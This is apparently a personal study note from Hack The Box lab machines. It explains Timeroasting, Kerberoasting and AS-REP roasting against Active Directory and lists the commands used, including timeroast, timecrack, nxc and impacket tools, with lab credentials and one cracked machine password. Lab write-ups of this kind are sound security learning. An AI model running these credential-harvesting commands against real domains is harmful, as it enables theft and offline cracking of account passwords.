---
created: 2025-11-12
modified: 2025-11-12
---

#Time-Roasting
#Kerberoasting
#AS_REP-Roasting


## Time Roasting

Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID

#### How Windows uses NTP
Windows hosts (clients, servers, domain controllers) rely on **Network Time Protocol (NTP)** to synchronize clocks.
In Active Directory, correct time sync is critical because Kerberos tickets have strict time tolerances (usually ±5 minutes).To protect NTP messages, Windows uses a mechanism called **MS-SNTP (Microsoft’s implementation of NTP with authentication)**. **MS-SNTP** doesn’t use certificates. Instead, it uses **symmetric keys derived from machine account credentials** (computer accounts in AD).

> So, each computer account in the domain has a password (a long random string stored in AD). That password’s hash is also used to generate authentication material for NTP.

#### What the attacker can do

Normally, only domain computers use MS-SNTP with each other.
But the protocol allows a client to **request an authenticated NTP response** from a domain member.When responding, the domain member **signs part of the NTP response with its machine account key (derived from the computer account password hash)**.

This is where the vulnerability comes in: 

>*The attacker doesn’t need to be authenticated. They can just send a crafted NTP request and get back a response containing a **keyed hash (HMAC-MD5 by default) derived from the computer account password hash**.*


> [!summary]
> Timeroasting abuses Windows’ time synchronization protocol (MS-SNTP). By sending a special unauthenticated NTP request that references a computer account’s RID, an attacker can make a domain machine return a signed blob based on that account’s password hash. The attacker then takes that blob offline and attempts to crack it, just like Kerberoasting, to recover the machine account password.

[time roasting tool](https://github.com/SecuraBV/Timeroast)

Usage.

```bash
 python3 timeroast.py dc.rustykey.htb -o ../computer_hashes.txt
             
┌──(darklight㉿jinx)-[~/…/htb/machines/rustykey/Timeroast]
└─$ cat ../computer_hashes.txt| wc -l
16
```

we have 16 computer hashes.

To crack the hashes, the tool manual says `Outputs the resulting hashes in the hashcat format 31300 with the --username flag ("<RID>:$sntp-ms$<hash>$<salt>").` but hash cat does no have mode `31300` neither does it recognize the hashes 

```
hashcat ../computer_hashes.txt /usr/share/wordlists/rockyou.txt --username 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2855/5774 MB (1024 MB allocatable), 4MCU

No hash-mode matches the structure of the input hash.
```

But in the same repo there is another tool `timecrack.py` but had issues with it at first, i kept getting this error  `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte`. I resolved by converting the encoding of the rockyou.txt file to `utf-8`

```bash
iconv -f latin1 -t utf-8 /usr/share/wordlists/rockyou.txt -o rockyou_utf8.txt
```

Then proceeded to crack the hashes.

```bash
┌──(darklight㉿jinx)-[~/…/machines/rustykey/Timeroast/extra-scripts]
└─$ python3 timecrack.py ../../computer_hashes.txt rockyou_utf8.txt
[+] Cracked RID 1125 password: Rusty88!

1 passwords recovered.

```

We can also use `nxc`

```bash
nxc dc01.local.corp -M timeroast
```

## Kerberoasting

```bash
impacket-GetUserSPNs mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -k  -dc-host dc01.mirage.htb -request -outputfile tgs.txt
```

## AS-REP Roasting

AS-REP roasting is a Kerberos attack that targets **accounts with “Do not require Kerberos preauthentication”** enabled in Active Directory.

#### What it is
 In normal Kerberos, a user must prove they know their password (preauth) before the KDC returns a ticket (AS-REP). If preauth is **disabled** on an account, anyone can ask the KDC for that user’s AS-REP. The KDC encrypts part of the AS-REP with a key derived from the user’s password and sends it back. Attackers can then **offline-crack** that blob to recover the password (no more interaction with the domain needed).

```bash
impacket-GetNPUsers rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75 -usersfile users.txt -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer2$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer3$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer4$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer5$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer2$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer3$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer4$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer5$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer2$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer3$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer4$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer5$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rr.parker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mm.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User dd.ali doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] User nn.marcos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backupadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
```
